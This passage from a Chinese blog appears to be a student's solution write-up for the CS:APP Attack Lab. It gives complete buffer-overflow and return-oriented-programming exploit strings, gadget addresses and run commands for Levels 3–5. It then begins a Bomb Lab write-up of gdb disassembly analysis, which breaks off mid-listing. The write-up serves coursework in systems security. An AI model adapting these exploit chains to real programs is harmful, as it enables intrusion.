<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// getbuf 的 %rsp</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span>	<span class="comment">// 字符串的字节级表示</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>.&#x2F;hex2raw &lt; Level3.txt | .&#x2F;ctarget -q</strong> 运行程序</li>
</ul>
<h2 id="Result-2"><a href="#Result-2" class="headerlink" title="Result"></a>Result</h2><ul>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/11/CSAPP-Lab3/image-20240313120319386.png" class="" title="image-20240313120319386">

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li>在使用 gdb 设置断点得到字符串在 test 栈帧中的地址时，发现的一些问题</li>
<li>第一次设置的断点在 test 的 0x40196c，得到 %rsp &#x3D; 0x5561dca8，所以推测字符串在 test 栈帧中存放在 0x5561dcd0，果不其然是错的</li>
<li>第二次设置的断点在 getbuf 的 0x4017a8，得到 test 的 %rsp &#x3D; 0x5561dca0，所以推测字符串存放在 0x5561dca8，是正确的</li>
<li>说明 test 在调用 getbuf 时，又额外分配了 8 字节的空间来存放返回地址</li>
</ul>
<h1 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming"></a>Return-Oriented Programming</h1><ul>
<li><p>对程序 RTARGET 执行代码注入攻击比对 CTARGET 要困难得多，因为它使用两种技术来阻止此类攻击：</p>
<ul>
<li>它使用随机化，使堆栈位置在一次运行中不同，这样就无法确定注入的代码将位于何处</li>
<li>它将保存堆栈的内存部分标记为不可执行，因此即使您可以将程序计数器设置为注入代码的开头，程序也会因分段错误而失败</li>
</ul>
</li>
<li><p>但我们可以通过执行现有代码而不是注入新代码来在程序中完成有用的事情</p>
</li>
<li><p>例如有一个 C 函数</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setval_210</span><span class="params">(<span class="type">unsigned</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	*p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>它的汇编代码如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">400f15: c7 07 d4 48 89 c7 		movl $0xc78948d4,(%rdi)</span><br><span class="line">400f1b: c3 						retq</span><br></pre></td></tr></table></figure>

<ul>
<li><p>我们发现字节序列 48 89 c7 对指令 movq %rax,%rdi 编码、c3 对 ret 编码，这样我们就有了一个从 0x400f18 开始的小工具，它将复制寄存器 %rax 中的 64 位值到寄存器 %rdi</p>
</li>
<li><p>我们可以通过将这些小工具的地址放入栈中，每个小工具由一系列条指令和最后一个字节序列为 0xc3 编码的 ret 指令构成</p>
</li>
<li><p>当我们从配置的起始地址开始执行时，每个小工具的 ret 指令会跳转到下一个小工具的开头，从而执行一系列 n 个小工具</p>
</li>
</ul>
<img src="/2024/03/11/CSAPP-Lab3/image-20240313153659095.png" class="" title="image-20240313153659095">

<ul>
<li><p>说明文档的提醒</p>
<ul>
<li>小工具场由 rtarget 副本中的函数 start_farm 和 end_farm 划分</li>
<li>不要尝试从程序代码的其他部分构造小工具</li>
</ul>
</li>
<li><p>一些指令对应的字节级表示</p>
</li>
</ul>
<img src="/2024/03/11/CSAPP-Lab3/image-20240313154452626.png" class="" title="image-20240313154452626">

<h1 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h1><ul>
<li>要求<ul>
<li>重复 Level2 的攻击，但使用小工具在程序 RTARGET 上执行此操作。</li>
<li>可以使用包含 movq、popq、ret、nop 指令类型的小工具构建解决方案</li>
<li>仅使用前 8 个 x86-64 寄存器 （%rax – %rdi）</li>
</ul>
</li>
<li>说明文档的一些建议<ul>
<li>您需要的所有小工具都可以在 rtarget 代码区域中找到，该代码区域由函数 start_farm 和 mid_farm 分隔</li>
<li>当小工具使用 popq 指令时，它会从堆栈中弹出数据。因此，您的漏洞利用字符串将包含小工具地址和数据的组合</li>
</ul>
</li>
<li>通过命令：<strong>objdump -d .&#x2F;rtarget&gt;&gt; rtarget.s</strong> 得到 rtarget.s 文件</li>
<li>思路分析<ul>
<li>通过 popq %rdi 将存放在栈中的 cookie 放入 %rdi</li>
<li>再通过 ret 取出并执行 touch2 的起始地址，实现跳转</li>
<li>popq %rdi 是字节序列为 <strong>5f</strong>，在 rtarget 的 start_farm 和 mid_farm 间并没有找到包含 5f 的字节序列，所以我们需要通过另一个寄存器中转</li>
<li>0x4019a7 处有字节序列 8d 87 51 73 58 90，取 <strong>0x4019ab</strong> 处 58 90 编码为 movq %rax nop，将 cookie 先存放在 %rax</li>
<li>0x4019c3 处有字节序列 c7 07 48 89 c7 90，取 <strong>0x4019c5</strong>  处 48 89 c7 90 编码为 movq %rax,%rdi nop，再将 cookie 从 %rax 传递到 %rdi</li>
</ul>
</li>
</ul>
<h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>cookie 值为 0x59b997fa</li>
<li>touch2 的起始地址为 0x4017ec</li>
<li>创建 Level4.txt 文件，写入输入值的字节级表示</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// popq %rax ret</span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// cookie </span></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// moveq %rax,%rdi ret </span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// touch2 的起始地址</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>.&#x2F;hex2raw &lt; Level4.txt | .&#x2F;rtarget -q</strong> 运行程序</li>
</ul>
<h2 id="Result-3"><a href="#Result-3" class="headerlink" title="Result"></a>Result</h2><ul>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/11/CSAPP-Lab3/image-20240314103504643.png" class="" title="image-20240314103504643">



<h1 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h1><ul>
<li><p>官方劝退</p>
<ul>
<li><p>在你进入第 5 阶段之前，请停下来考虑一下到目前为止你所取得的成就</p>
</li>
<li><p>在第 2 阶段和第 3 阶段，您让程序执行您自己设计的机器代码。如果 CTARGET 是一个网络服务器，你可以将自己的代码注入到遥远的机器中</p>
</li>
<li><p>在第 4 阶段中，您规避了现代系统用来阻止缓冲区溢出攻击的两个主要设备。虽然您没有注入自己的代码，但您可以注入一种通过将现有代码序列拼接在一起来运行的程序</p>
</li>
<li><p>您还获得了 95&#x2F;100 的实验室分数。这是一个很好的分数。如果您有其他紧迫的义务，请考虑立即停止</p>
</li>
<li><p>第 5 阶段要求您对 RTARGET 进行 ROP 攻击，以使用指向 cookie 的字符串表示形式的指针调用函数 touch3</p>
</li>
<li><p>这似乎并不比使用 ROP 攻击调用 touch2 困难得多，只是我们已经做到了</p>
</li>
<li><p>此外，第 5 阶段只计算 5 分，这并不是衡量它所需努力的真实衡量标准。对于那些想要超越课程正常期望的人来说，这更像是一个额外的学分问题</p>
</li>
</ul>
</li>
<li><p>说明文档的一些建议</p>
<ul>
<li><p>您可以在 rtarget 中由函数 start_farm 和 end_farm 分隔的代码区域中使用小工具，除了第 4 阶段中使用的小工具外，这个扩展的农场还包括不同 movl 指令的编码</p>
</li>
<li><p>服务器场的这一部分中的字节序列还包含用作功能 nop 的 2 字节指令，即它们不会更改任何寄存器或内存值</p>
</li>
</ul>
</li>
<li><p>思路分析</p>
<ul>
<li>%rsp 的地址值不能通过 gdb 调试工具确定，但我们可以执行 movq %rsp,%rdi 相关的指令得到 %rsp</li>
<li>不能简单的将 cookie 字符串存储在 %rsp，因为执行 movq %rsp,%rdi 后执行 ret，会取出并执行 cookie 字符串，造成错误</li>
<li>可以将 cookie 字符串存储在 touch3 起始地址后边，ret 取出执行 touch3 的起始地址</li>
<li>start_farm 和 end_farm 间有一个特殊的指令 <strong>lea (%rdi,%rsi,1),%rax</strong>， 我们事先计算好 cookie 字符串距离 %rsp 的偏移量，通过 %rsp + 偏移量将 cookie 字符串的起始地址赋给 %rdi</li>
</ul>
</li>
<li><p>想法很美好，现实很骨感！并不是需要哪些指令，就有哪些指令的 …… 我们需要东拼西凑实现我们的想法</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp,%rax 			# 0x401a06	（得到 %rsp）</span><br><span class="line">ret</span><br><span class="line">movq %rax,%rdi			# 0x4019c5	（将 %rsp 赋值给 %rdi 用作计算）</span><br><span class="line">ret</span><br><span class="line">popq %rax				# 0x4019ab	（弹出偏移量到 %rax）</span><br><span class="line">ret</span><br><span class="line"># 偏移量</span><br><span class="line">movq %eax,%edx 			# 0x4019dd	（转移偏移量到 %esi）</span><br><span class="line">ret</span><br><span class="line">movq %edx,%ecx			# 0x401a69</span><br><span class="line">ret</span><br><span class="line">movq %ecx,%esi			# 0x401a13</span><br><span class="line">ret</span><br><span class="line">lea (%rdi,%rsi,1),%rax	# 0x4019d6	（计算字符串的起始地址）</span><br><span class="line">ret</span><br><span class="line">movq %rax,%rdi			# 0x4019c5	（将字符串起始地址赋给 %rdi 作为 touch3 的参数）</span><br><span class="line">ret						#			（取出并执行 touch3）</span><br><span class="line"># touch3 起始地址</span><br><span class="line"># cookie</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说明文档提醒我们，有些字节序列还包含用作功能 nop 的 2 字节指令，比如 0x401a69 处 89 d1 08 db，89 d1 编码为 movl %edx,%ecx，08 db 实测没有什么影响</p>
</blockquote>
<ul>
<li>ret，%rsp +&#x3D; 8，popq，%rsp -&#x3D; 8，所以偏移量为：<strong>0x48（72）</strong></li>
</ul>
<h2 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>touch3 的起始地址 0x4018fa</li>
<li>cookie 字符串形式的字节级表示 35 39 62 39 39 37 66 61</li>
<li>创建 Level5.txt 文件，写入输入值的字节级表示</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	</span><br><span class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movq %rsp,%rax</span></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movq %rax,%rdi	</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// popq %rax</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// 偏移量</span></span><br><span class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movl %eax,%edx</span></span><br><span class="line"><span class="number">69</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movl %edx,%ecx</span></span><br><span class="line"><span class="number">13</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movl %ecx,%esi</span></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// lea (%rdi,%rsi,1),%rax</span></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movq %rax,%rdi</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// touch3 起始地址</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span>	<span class="comment">// cookie 字符串</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>.&#x2F;hex2raw &lt; Level5.txt | .&#x2F;rtarget -q</strong> 运行程序</li>
</ul>
<h2 id="Result-4"><a href="#Result-4" class="headerlink" title="Result"></a>Result</h2><ul>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/11/CSAPP-Lab3/image-20240315092444544.png" class="" title="image-20240315092444544">

<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/JayL-zxl/p/14361158.html">图文并茂-超详解 CS:APP: Lab3-Attack（附带栈帧分析) - 周小伦 - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/476396465">CSAPP | Lab3-Attack Lab 深入解析 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.viseator.com/2017/07/18/CS_APP_AttackLab/#%E5%AE%9E%E9%AA%8C%E5%B0%8F%E7%BB%93">深入理解计算机系统（CS:APP) - Attack Lab详解 | viseator’s blog</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/410418053">csapp-attacklab 详解 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/C__C_/article/details/111308959">CSAPP实验——AttackLab_csapp attack lab-CSDN博客</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/03/05/CSAPP-Lab2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yiweiBoi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/05/CSAPP-Lab2/" class="post-title-link" itemprop="url">CSAPP BombLab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-05 16:14:23" itemprop="dateCreated datePublished" datetime="2024-03-05T16:14:23+08:00">2024-03-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-27 14:33:31" itemprop="dateModified" datetime="2024-03-27T14:33:31+08:00">2024-03-27</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
<li><p><strong>bomb.c</strong> 文件是我们需要运行和学习的文件，但这个文件中的代码并不完整，有些函数的代码被隐藏起来无法直接查看，因此也就需要我们通过学习的汇编知识反推出相关函数的实现，从而找出答案完成实验</p>
</li>
<li><p>在实验开始之前，我们需要下载调试器 <strong>gdb</strong>，通过命令：<strong>sudo apt-get install gdb</strong>（ubuntu）</p>
<blockquote>
<p>常用的 gdb 命令：gdb &lt; file &gt;：调试文件，例如：gdb bomb，r：执行被调试程序，x&#x2F;s &lt;0x……&gt;：检查一个字符串在内存中的内容</p>
<p>详见：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf">http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf</a></p>
</blockquote>
</li>
<li><p>我们还需要通过反汇编工具来得到 <strong>bomb.c</strong> 的汇编代码，通过命令：<strong>objdump -d .&#x2F;bomb &gt;&gt; bomb.s</strong></p>
</li>
<li><p>通过查看生成的汇编代码文件 <strong>bomb.s</strong> 来逆向了解函数的实现细节</p>
</li>
<li><p>每次输入 key 非常麻烦，我们可以创建一个 txt 文件，将各个关卡的 key 放入，直接在终端输入命令 <strong>.&#x2F;bomb result.txt</strong> 就可以运行而不需要每次输入很多 key 了</p>
<blockquote>
<p>result 为文件名，Ubuntu 系统上通过命令 touch result.txt 创建</p>
</blockquote>
</li>
</ul>
<h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><ul>
<li>main 函数中关于 phase_1 的代码</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to my fiendish little bomb. You have 6 phases with\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which to blow yourself up. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hmm...  Six phases must be more secure than one phase! */</span></span><br><span class="line">    input = read_line();             <span class="comment">/* Get input                   */</span></span><br><span class="line">    phase_1(input);                  <span class="comment">/* Run the phase               */</span></span><br><span class="line">    phase_defused();                 <span class="comment">/* Drat!  They figured it out!</span></span><br><span class="line"><span class="comment">				      * Let me know how they did it. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Phase 1 defused. How about the next one?\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>phase_1 可能需要我们输入一个值，检测这个值是否正确，所以我们就先随便输入一个看一下具体效果</p>
<blockquote>
<p>因为 bomb.c 中代码并不完整，所以我们无法编译获得可执行文件来运行，但我们可以通过 gdb 来进行调试</p>
</blockquote>
</li>
<li><p>我们输入 hello world ! ，发现不出意外的 <strong>BOOM ! ! !</strong> ，炸弹爆炸了！所以我们就可以大致确定第一关需要我们通过汇编代码来找到正确答案</p>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240305193500345.png" class="" title="image-20240305193500345">

<h2 id="phase-1-1"><a href="#phase-1-1" class="headerlink" title="phase_1"></a>phase_1</h2><ul>
<li>仔细分析 phase_1 的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:												</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp					# 将 %rsp 上的值 - 0x8</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi				# 将立即数 0x402400 复制到 %esi </span><br><span class="line">  </span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;	# 调用 strings_not_equal 函数</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax					# 测试返回的值（在 %rax 上）</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;		# if %rax 上的值 == 0，跳转到 400ef7</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;		# 执行 explode_bomb 函数，炸弹爆炸</span><br><span class="line">  </span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp					# 将 %rsp 上的值 + 0x8（释放内存）</span><br><span class="line">  400efb:	c3                   	retq   								# 返回</span><br></pre></td></tr></table></figure>

<ul>
<li><p>为 phase_1 的栈帧分配 0x8 个字节的空间，%esi &#x3D; 0x402400</p>
</li>
<li><p>调用函数 strings_not_equal，if %rax &#x3D;&#x3D; 0，<strong>跳转到 400ef7</strong>，else <strong>调用 explode_bomb 函数，炸弹爆炸</strong></p>
<blockquote>
<p>strings_not_equal 函数有两个参数，一个是 phase_1 的参数 %rdi，即我们输入的值，另一个是 %rsi 上的立即数 0x402400</p>
<p>通过函数名，我们也大致可以明白 string_not_equal 的作用是比较 %rdi 是否和 %rsi 相等</p>
<p>我们可以通过 gdb 命令：<strong>x&#x2F;s 0x402400</strong>，找到内存中 0x402400 处字符串的内容，即正确答案</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240305210128161.png" class="" title="image-20240305210128161">

<ul>
<li><p><strong>跳转到 400ef7</strong>，%rsp -&#x3D; 0x8，return</p>
<blockquote>
<p>释放内存并返回</p>
</blockquote>
</li>
</ul>
<h2 id="string-not-equal"><a href="#string-not-equal" class="headerlink" title="string_not_equal"></a>string_not_equal</h2><ul>
<li>即使我们可能已经知道正确答案了，我们也应该阅读一下 strings_not_equal 的汇编代码，看看有没有意外收获</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0000000000401338 &lt;strings_not_equal&gt;:							</span><br><span class="line">  401338:	41 54                	push   %r12								# 将 %r12 上的值入栈</span><br><span class="line">  40133a:	55                   	push   %rbp								# 将 %rbp 上的值入栈</span><br><span class="line">  40133b:	53                   	push   %rbx								# 将 %rbx 上的值入栈</span><br><span class="line">  40133c:	48 89 fb             	mov    %rdi,%rbx						# 将 %rdi 上的值复制到 %rbx</span><br><span class="line">  40133f:	48 89 f5             	mov    %rsi,%rbp						# 将 %rsi 上的值复制到 %rbp</span><br><span class="line">  </span><br><span class="line">  401342:	e8 d4 ff ff ff       	callq  40131b &lt;string_length&gt;			# 调用 string_length 函数</span><br><span class="line">  401347:	41 89 c4             	mov    %eax,%r12d						# 将 %eax 返回值复制到 %r12d</span><br><span class="line">  40134a:	48 89 ef             	mov    %rbp,%rdi						# 将 %rbp 上的值复制到 %rdi</span><br><span class="line">  40134d:	e8 c9 ff ff ff       	callq  40131b &lt;string_length&gt;			# 调用 string_length 函数</span><br><span class="line">  </span><br><span class="line">  401352:	ba 01 00 00 00       	mov    $0x1,%edx						# 将立即数 0x1 复制到 %edx</span><br><span class="line">  401357:	41 39 c4             	cmp    %eax,%r12d						# 比较 %eax 上的值</span><br><span class="line">  40135a:	75 3f                	jne    40139b &lt;strings_not_equal+0x63&gt;	# if !=，跳转到 40139b</span><br><span class="line">  </span><br><span class="line">  40135c:	0f b6 03             	movzbl (%rbx),%eax						# 将 %rbx 上的值所指向的值复制到 %eax</span><br><span class="line">  40135f:	84 c0                	test   %al,%al							# 测试 %al（%rax 的低 8 位） 上的值</span><br><span class="line">  401361:	74 25                	je     401388 &lt;strings_not_equal+0x50&gt;	# if == 0，跳转到 401388</span><br><span class="line">  </span><br><span class="line">  401363:	3a 45 00             	cmp    0x0(%rbp),%al					# 比较 %rbp 上的值所指向的值和 %al 上的值</span><br><span class="line">  401366:	74 0a                	je     401372 &lt;strings_not_equal+0x3a&gt;	# if ==，跳转到 401372</span><br><span class="line">  401368:	eb 25                	jmp    40138f &lt;strings_not_equal+0x57&gt;	# 直接跳转到 40138f</span><br><span class="line">  </span><br><span class="line">  40136a:	3a 45 00             	cmp    0x0(%rbp),%al					# 比较 %rbp 上的值所指向的值和 %al 上的值</span><br><span class="line">  40136d:	0f 1f 00             	nopl   (%rax)							# </span><br><span class="line">  401370:	75 24                	jne    401396 &lt;strings_not_equal+0x5e&gt;	# if !=，跳转到 401396</span><br><span class="line">  </span><br><span class="line">  401372:	48 83 c3 01          	add    $0x1,%rbx						# 将 %rbx 上的值 + 1</span><br><span class="line">  401376:	48 83 c5 01          	add    $0x1,%rbp						# 将 %rbp 上的值 + 1</span><br><span class="line">  40137a:	0f b6 03             	movzbl (%rbx),%eax						# 将 %rbx 上的值所指向的值复制到 %eax</span><br><span class="line">  40137d:	84 c0                	test   %al,%al							# 测试 al 上的值</span><br><span class="line">  40137f:	75 e9                	jne    40136a &lt;strings_not_equal+0x32&gt;	# if != 0,跳转到 40136a</span><br><span class="line">  401381:	ba 00 00 00 00       	mov    $0x0,%edx						# 将立即数 0x0 复制到 %edx</span><br><span class="line">  401386:	eb 13                	jmp    40139b &lt;strings_not_equal+0x63&gt;	# 直接跳转到 